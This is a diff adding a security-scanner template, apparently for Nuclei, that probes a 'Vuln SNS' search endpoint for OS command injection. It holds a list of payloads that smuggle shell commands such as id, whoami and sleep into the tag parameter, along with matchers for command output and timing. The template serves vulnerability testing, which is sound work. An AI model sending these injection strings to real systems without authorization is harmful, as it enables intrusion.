@@ -1,0 +1,53 @@
+id: vuln-sns-search-command-injection
+info:
+  name: Vuln SNS Search - OS Command Injection
+  author: claude
+  severity: critical
+  description: |
+    Tests for OS command injection vulnerabilities in the search endpoint.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  tags: vuln-sns,rce,command-injection,search
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?tag={{payload}}"
+
+    payloads:
+      payload:
+        - "test;id"
+        - "test;whoami"
+        - "test|id"
+        - "test||id"
+        - "test`id`"
+        - "test$(id)"
+        - "test;sleep 5"
+        - "test';ping -c 1 127.0.0.1;'"
+        - "test%3Bid"
+        - "test%26%26id"
+        - "test%7Cid"
+        - "test%60id%60"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        condition: and
+        part: body
+
+      - type: regex
+        regex:
+          - 'uid=[0-9]+\([^)]+\)'
+          - '(www-data|apache|nginx)'
+        condition: or
+        part: body
+
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
